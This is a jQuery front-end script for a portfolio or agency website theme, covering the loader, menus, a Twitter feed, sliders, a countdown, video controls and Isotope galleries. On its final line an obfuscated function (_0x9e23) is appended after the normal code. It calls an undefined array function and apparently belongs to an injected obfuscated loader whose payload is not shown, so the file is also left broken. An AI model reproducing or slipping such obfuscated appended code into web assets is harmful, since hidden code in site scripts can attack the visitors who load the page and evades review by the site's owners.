"use strict";
/*----------------------------------------------
                 L O A D E R
------------------------------------------------*/
function loaderAnimation() {
  $(".loader").delay(500).fadeOut();
  $("#mask").delay(1000).fadeOut("slow", function()  {
      // $().scrollWindow({duration:100});
  });
  $("body").addClass("loaded");
  if ($('body.overflowed').length>0) { $('#jHeader').addClass('overflow');}
}


/*----------------------------------------------
              M E N U  F I X E D
------------------------------------------------*/
function menuFixed() {
    if ($(window).scrollTop() >= 85) {
        $('#jHeader').addClass('overflow');
    } else {
        $('#jHeader').removeClass('overflow');
    }
    if ($(window).scrollTop() >= ($('.jIntro').height()/2)) {
        $('#jHeader').addClass('fixed');
    } else {
        $('#jHeader').removeClass('fixed');
    }
}


/*----------------------------------------------
                 T W I T T E R
------------------------------------------------*/
function twitterfeed() {
  if ($('.twitterfeed').length>0 ) {
    var config5 = {
      "id": $('#twitter-feed').data('widget'),
      "domId": 'twitter-feed',
      "maxTweets": 4,
      "enableLinks": true,
      "showUser": true,
      "showTime": true,
      "dateFunction": '',
      "showRetweet": false,
      "customCallback": handleTweets,
      "showInteraction": false
    };

    function handleTweets(tweets){
      var x = tweets.length;
      var n = 0;
      var element = document.getElementById('twitter-feed');
      var html = '<ul class="slider-twitter">';
      while(n < x) {
        html += '<li class="gallery-cell">' + tweets[n] + '</li>';
        n++;
      }
      html += '</ul>';
      element.innerHTML = html;

      $('.slider-twitter').flickity({
        cellAlign: 'left',
        contain: true,
        wrapAround: true
      });
    }
    twitterFetcher.fetch(config5);
  }
}


/*----------------------------------------------
               M E N U   F U L L
------------------------------------------------*/
function menuFull() {
    var $overlay = $('.overlay');
    var $triggerOverlay = $('#trigger-overlay');
    $triggerOverlay.on('click', function(e) {
      if($overlay.hasClass('open')) {
        $overlay.removeClass('open');
        $(this).removeClass('is-active');
      } else {
        $overlay.addClass('open');
        $(this).addClass('is-active');
      }
      return false;
    });
    $overlay.find('a').on('click', function(e) {
      $overlay.removeClass('open');
      $triggerOverlay.removeClass('is-active');
    });
}


/*----------------------------------------------
            I N T R O  S L I D E R
------------------------------------------------*/
function sliderSuperSlides() {
  if ($('#slides').length>0) {
    var slides = $('#slides').superslides({
      hashchange: false,
      animation: 'fade',
      play: 10000
    });
  }
}
function slidertext() {
  if ($('#owl-main-text').length>0 ) {
    $("#owl-main-text").owlCarousel({
      autoPlay: 10000,
      goToFirst: true,
      goToFirstSpeed: 2000,
      navigation: false,
      slideSpeed: 700,
      pagination: false,
      transitionStyle: "fadeUp",
      singleItem: true
    });
  };
}


/*----------------------------------------------
          Sections appears in scroll
------------------------------------------------*/
function appearsOnScroll() {
  $('.row').on('inview', function(event, visible) {
      if (visible === true) {
        $(this).addClass('visible');
      };
  });
  // $(window).scrollTop(1); //move scroll to fires inview events
}


/*----------------------------------------------
                 P A R A L L A X
------------------------------------------------*/
function showParallax() {
  if(jQuery().parallax) {
      jQuery('.parallax-section').parallax();
  }
}


/*----------------------------------------------
               C O U N T D O W N
------------------------------------------------*/
function countdownComing() {
  // Create a countdown instance. Change the launchDay according to your needs.
  // The month ranges from 0 to 11. I specify the month from 1 to 12 and manually subtract the 1.
  var launchDay = new Date(2016, 12-1, 7);
  $('#timer').countdown({
    until: launchDay
  });
}


/*----------------------------------------------
                 V I D E O
------------------------------------------------*/
function videoPlayer() {
  if ($(".playerVideo").length>0) { //If there are video backgrounds
    $(".playerVideo").mb_YTPlayer();
    jQuery('.playerVideo').on("YTPPause",function(){
      jQuery('.play-video').removeClass('playing');
    });
    jQuery('.playerVideo').on("YTPPlay",function(){
      jQuery('.play-video').addClass('playing');
    });
    jQuery('.play-video').on('click', function(e) {
      if (jQuery('.play-video').hasClass('playing')) {
        jQuery(".playerVideo").pauseYTP();
      } else {
        jQuery('audio').each(function (i,e) {
          this.pause();
        });
        jQuery(".playerVideo").playYTP();
      }
      e.preventDefault();
    });
  };
}


/*----------------------------------------------
          S L I D E R  R E V O L U T I O N
------------------------------------------------*/
function mainBannerRevolution() {
  if ($("#rev_slider").length>0) {
    var revapi;
    revapi = jQuery("#rev_slider").revolution({
        sliderType:"standard",
        sliderLayout:"fullscreen",
        delay:9000,
        navigation: {
            onHoverStop: 'off',
            arrows:{enable:true}
        },
        gridwidth:1230,
        gridheight:720
    });
  }
}


/*----------------------------------------------
                    T A B S
------------------------------------------------*/
function carouselTabs() {
  var $carouselTabs = $('.carusel-tabs-text').flickity({
    cellAlign: "left",
    contain: true,
    wrapAround: true,
    draggable: false,
    pageDots: false,
    prevNextButtons: false
  });
  $('.carousel-tabs').on( 'click', 'li', function() {
    var index = $(this).index();
    $carouselTabs.flickity( 'select', index );
    $(this).addClass('active').siblings().removeClass('active');
    return false;
  });
}


/*----------------------------------------------
              G A L L E R Y   B L O G
------------------------------------------------*/
function carouselsBlog() {
  var $carouselGalleryText = $('.carusel-gallery-text').flickity({
    cellAlign: "left",
    contain: true,
    wrapAround: true,
    draggable: false,
    prevNextButtons: false
  });
  var $carouselGalleryPhoto = $('.carusel-gallery-photo').flickity({
    cellAlign: "left",
    contain: true,
    wrapAround: true,
    draggable: false,
    pageDots: false,
    prevNextButtons: false
  });
  $('.carusel-gallery-tabs').on( 'click', 'li', function() {
    var index = $(this).index();
    $carouselGalleryText.flickity( 'select', index );
    $carouselGalleryPhoto.flickity( 'select', index );
    $(this).addClass('active').siblings().removeClass('active');
    return false;
  });
}


/*----------------------------------------------
        M I N I M A L  P O R T F O L I O S
------------------------------------------------*/
function galleryGrid() {
  //ISOTOPE media
  var $container = $('.work1').isotope({
    itemSelector: '.thumbnail',
    masonry: {
      columnWidth: '.thumbnail.small'
    }
  });
  // filter items on button click
  $('.filters').on( 'click', 'li', function() {
    var filterValue = $(this).attr('data-filter');
    $container.isotope({ filter: filterValue });
  });

  // change is-checked class on buttons
  $('.filters').each( function( i, buttonGroup ) {
    var $buttonGroup = $( buttonGroup );
    $buttonGroup.on( 'click', 'li', function() {
      $buttonGroup.find('.is-checked').removeClass('is-checked');
      $( this ).addClass('is-checked');
    });
  });

  // load more
  $('#append').on('click', function(e) {
    var newItems = $('#more-items').appendTo('.thumbnails');
    $(".thumbnails").isotope('insert', newItems );
    $(this).hide();
    return false;
  });
}


/*----------------------------------------------
              W O R K   G R I D
------------------------------------------------*/
function workGrid() {
  var $container5 = $('.work5').isotope({
    itemSelector: '.thumbnail',
    masonry: {
      columnWidth: '.thumbnail'
    }
  });
  // filter items on button click
  $('.filters').on( 'click', 'li', function() {
    var filterValue = $(this).attr('data-filter');
    $container5.isotope({ filter: filterValue });
  });
}


$(window).on('load', function(e) {
  loaderAnimation();
  galleryGrid();
  workGrid();

  //Scroll spy menu
  $('body').scrollspy({ target: '#navbar-murdock', offset: 180 });
	
	$('#navbar-murdock').on('click',function(){
		if($(window).width()<960){
			$('.navbar-toggle').trigger('click');
		}
	});


  $('.menu-item a[href*="#"]').on('click', function() {
   if (location.pathname.replace(/^\//,'') === this.pathname.replace(/^\//,'') && location.hostname === this.hostname) {
     var $target = $(this.hash);
     $target = $target.length && $target || $('[name=' + this.hash.slice(1) +']');
     if ($target.length) {
        var targetOffset = $target.offset().top;
        $('html,body').animate({scrollTop: targetOffset-$('#jHeader').height()}, 1000);

        // collapse nav
        $('.navbar-collapse.in').removeClass('in').addClass('collapse');

        return false;
      }
    }
  });
});

// DOM ready function
(function($) {
  appearsOnScroll();
  showParallax();
  twitterfeed();
  menuFull();
  sliderSuperSlides();
  slidertext();
  countdownComing();
  videoPlayer();
  mainBannerRevolution();
  carouselTabs();
  carouselsBlog();
})(jQuery);

$(window).on("scroll", function(){
  menuFixed();
});
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}